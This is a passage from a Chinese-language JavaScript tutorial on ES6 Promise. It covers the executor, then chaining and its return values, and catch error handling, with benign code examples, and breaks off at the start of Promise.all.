

<h3 id="32、-promise的介绍与使用"><a href="#32、-promise的介绍与使用" class="headerlink" title="32、 promise的介绍与使用"></a>32、 promise的介绍与使用</h3><p><strong>Promise 介绍：</strong></p>
<p>ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。</p>
<p>Promise对象, 可以<strong>将异步操作以同步的流程表达出来</strong>。使用 Promise 主要有以下好处：</p>
<ul>
<li>可以很好地解决<strong>回调地狱</strong>的问题（避免了层层嵌套的回调函数）。</li>
<li>语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。</li>
</ul>
<p><strong>Promise 使用：</strong></p>
<p><strong>语法</strong></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token comment">/* executor函数 */</span>
    <span class="token comment">// ... some code</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//success</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//failure</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>参数<br><code>executor</code> 函数在<code>Promise</code>构造函数执行时同步执行，被传递 <code>resolve</code> 和 <code>reject</code> 函数（<code>executor</code>函数在<code>Promise</code>构造函数返回新建对象前被调用）。<br><code>executor</code> 内部通常会执行一些异步操作，一旦完成，可以调用<code>resolve</code>函数来将<code>promise</code>状态改成<code>fulfilled</code>(完成)，或者将<code>promise</code>的状态改为<code>rejected</code>(失败)。<br>如果在<code>executor</code>函数中抛出一个错误，那么该<code>promise</code> 状态为<code>rejected</code>。<code>executor</code>函数的返回值被忽略。</li>
<li>简单使用</li>
</ol>
<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">,</span> <span class="token string">'done'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">timeout</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//done</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>原型方法</strong></p>
<p>Promise.prototype.then(onFulfilled, onRejected)</p>
<ol>
<li><p>语法<br><code>p.then(onFulfilled, onRejected);</code><br><code>p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;);</code></p>
</li>
<li><p>含义<br>为 <code>Promise</code>实例添加状态改变时的回调函数。<code>then</code>方法的第一个参数是<code>resolved</code>状态的回调函数，第二个参数（可选）是<code>rejected</code>状态的回调函数。</p>
</li>
<li><p>链式操作<br><code>then</code>方法返回的是一个新的<code>promise</code>，因此可以采用链式写法，即<code>then</code>方法后面再调用另一个<code>then</code>方法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//1</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//undefined</span>
        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//2</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"err"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//Error: err</span>
        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//3</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：①不管是<code>then</code>方法的<code>onfulfilled</code>函数参数执行还是<code>onrejected</code>（可选参数）函数参数执行，<code>then</code>方法返回的都是一个新的<code>Promise</code>对象，都可以继续采用链式写法调用另一个<code>then</code>方法。②<code>Promise.prototype.catch()</code>方法返回的也是一个<code>Promise</code>对象。<code>then</code>方法和<code>catch</code>方法可以链式操作。</p>
</li>
<li><p>返回值<br><code>then</code>方法返回一个<code>Promise</code>，而它的行为与<code>then</code>中的被调用的回调函数(<code>onfulfilled</code>函数&#x2F;<code>onrejected</code>函数)的返回值有关。<br>(1) 如果<code>then</code>中的回调函数返回一个值，那么<code>then</code>返回的<code>Promise</code>将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">42</span> <span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token parameter">result</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 42</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2) 如果<code>then</code>中的回调函数抛出一个错误，那么<code>then</code>返回的<code>Promise</code>将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Error: err</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(3) 如果<code>then</code>中的回调函数返回一个已经是接受状态的<code>Promise</code>，那么<code>then</code>返回的<code>Promise</code>也会成为接受状态，并且将那个<code>Promise</code>的接受状态的回调函数的参数值作为该被返回的<code>Promise</code>的接受状态回调函数的参数值。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ok</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(4) 如果<code>then</code>中的回调函数返回一个已经是拒绝状态的<code>Promise</code>，那么<code>then</code>返回的<code>Promise</code>也会成为拒绝状态，并且将那个<code>Promise</code>的拒绝状态的回调函数的参数值作为该被返回的<code>Promise</code>的拒绝状态回调函数的参数值。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
           <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Error: err</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(5) 如果<code>then</code>中的回调函数返回一个未定状态（<code>pending</code>）的<code>Promise</code>，那么<code>then</code>返回<code>Promise</code>的状态也是未定的，并且它的终态与那个<code>Promise</code>的终态相同；同时，它变为终态时调用的回调函数参数与那个<code>Promise</code>变为终态时的回调函数的参数是相同的。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ok</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：这里是<code>then</code>方法中被调用回调函数的返回值与<code>then</code>方法返回的<code>Promise</code>对象状态之间的关系。</p>
</li>
</ol>
<p><strong>Promise.prototype.catch(onRejected)</strong></p>
<ol>
<li><p>语法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span>onRejected<span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 拒绝</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>含义<br><code>Promise.prototype.catch</code>方法是<code>.then(null, rejection)</code>的别名，用于指定发生错误时的回调函数，返回一个新的<code>promise</code>对象。</p>
</li>
<li><p>用法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//reject方法的作用，等同于抛出错误</span>
    <span class="token comment">//throw new Error('err');</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Err: err</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//--------等价写法---------</span>
p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Err: err</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：由于<code>.catch</code>方法是<code>.then(null, rejection)</code>的别名，故<code>.then</code>中的链式操作(3)、返回值(4)等语法在<code>.catch</code>中都适用。</p>
</li>
<li><p>一般总是建议，<code>Promise</code> 对象后面要跟<code>catch</code>方法，这样可以处理 <code>Promise</code>内部发生的错误。<code>catch</code>方法返回的还是一个 <code>Promise</code> 对象，因此后面还可以接着调用<code>then</code>方法。</p>
</li>
<li><p><code>Promise</code>对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个<code>catch</code>语句捕获。 即：当前<code>catch</code>方法可以捕获上一个<code>catch</code>方法(包括上一个<code>catch</code>)到当前<code>catch</code>(不包括当前<code>catch</code>)方法之间所有的错误，如果没有错误，则当前<code>catch</code>方法不执行。</p>
<pre class="line-numbers language-none"><code class="language-none">new Promise(() &#x3D;&gt; &#123;
    throw new Error(&#39;err1&#39;);
&#125;)
    .then(() &#x3D;&gt; &#123;console.log(1);&#125;)
    .then(() &#x3D;&gt; &#123;console.log(2);&#125;)
    .catch((err) &#x3D;&gt; &#123;
        console.log(err); &#x2F;&#x2F;Err: err1
        throw  new Error(&#39;err2&#39;);
    &#125;)
    .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>一般来说，不要在<code>then</code>方法里面定义<code>Reject</code>状态的回调函数（即<code>then</code>的第二个参数），总是使用<code>catch</code>方法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// bad</span>
<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token comment">/* success */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token comment">/* error */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// good</span>
<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token comment">/* success */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token comment">/* error */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面<code>then</code>方法执行中的错误，也更接近同步的写法。</p>
</li>
<li><p>与传统的<code>try/catch</code>代码块不同的是，即使没有使用<code>catch</code>方法指定错误处理的回调函数，<code>Promise</code> 对象抛出的错误也不会中止外部脚本运行。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 下面一行会报错，因为x没有声明</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'over'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//Uncaught (in promise) ReferenceError: x is not defined</span>
<span class="token comment">//over</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>在异步函数中抛出的错误不会被<code>catch</code>捕获到</p>
<pre class="line-numbers language-none"><code class="language-none">new Promise((resolve, reject) &#x3D;&gt; &#123;
    setTimeout(() &#x3D;&gt; &#123;
        throw &#39;Uncaught Exception!&#39;;
    &#125;, 1000);
&#125;).catch(() &#x3D;&gt; &#123;
    console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行
&#125;);

new Promise((resolve, reject) &#x3D;&gt; &#123;
    setTimeout(() &#x3D;&gt; &#123;
        reject();
    &#125;, 1000);
&#125;).catch(() &#x3D;&gt; &#123;
    console.log(&#39;err&#39;); &#x2F;&#x2F;err
&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>在<code>resolve()</code>后面抛出的错误会被忽略</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">throw</span> <span class="token string">'Silenced Exception!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不会执行</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>Promise.all(iterable)</strong></p>
<ol>
<li><p>语法<br><code>var p = Promise.all([p1, p2, p3]);</code></p>
</li>
